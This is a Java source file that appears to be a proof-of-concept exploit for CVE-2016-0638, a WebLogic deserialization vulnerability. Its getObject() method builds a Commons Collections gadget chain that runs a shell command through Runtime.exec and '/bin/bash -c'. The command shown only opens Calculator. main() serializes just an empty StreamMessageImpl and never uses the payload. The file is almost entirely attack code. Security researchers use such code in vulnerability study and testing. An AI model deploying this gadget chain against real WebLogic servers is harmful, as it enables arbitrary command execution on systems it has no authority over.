package com.weblogcVul;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import weblogic.jms.common.StreamMessageImpl;
import weblogic.utils.io.ObjectInput;
import weblogic.utils.io.ObjectOutput;
import ysoserial.payloads.CommonsCollections1;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.jms.JMSException;
import javax.jms.StreamMessage;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CVE_2016_0638 {
    public static Object getObject() throws IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, ClassNotFoundException {
        String          cmd         = "open /System/Applications/Calculator.app";
        Transformer[]   tarray      = new Transformer[]
                {
                        new ConstantTransformer( Runtime.class ),
                        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                        new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/bash", "-c", cmd}})
                };
        Transformer         tchain      = new ChainedTransformer( tarray );
        Map                 normalMap   = new HashMap();
        Map                 lazyMap     = LazyMap.decorate( normalMap, tchain );
        Class               clazz       = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
        Constructor cons        = clazz.getDeclaredConstructor( Class.class, Map.class );
        cons.setAccessible( true );
        InvocationHandler   ih          = ( InvocationHandler )cons.newInstance( Override.class, lazyMap );
        Map                 mapProxy    = ( Map ) Proxy.newProxyInstance
                (
                        Map.class.getClassLoader(),
                        new  Class[] { Map.class },
                        ih
                );
        Object              obj         = cons.newInstance( Override.class, mapProxy );
        return obj;
    }
    public static void main(String[] args) throws Exception {
        StreamMessage streamMessage = new StreamMessageImpl();
        FileOutputStream fout = new FileOutputStream("/tmp/cve_2016_0638.ser");
        ObjectOutputStream out = new ObjectOutputStream(fout);
        out.writeObject(streamMessage);
        out.close();

    }

}
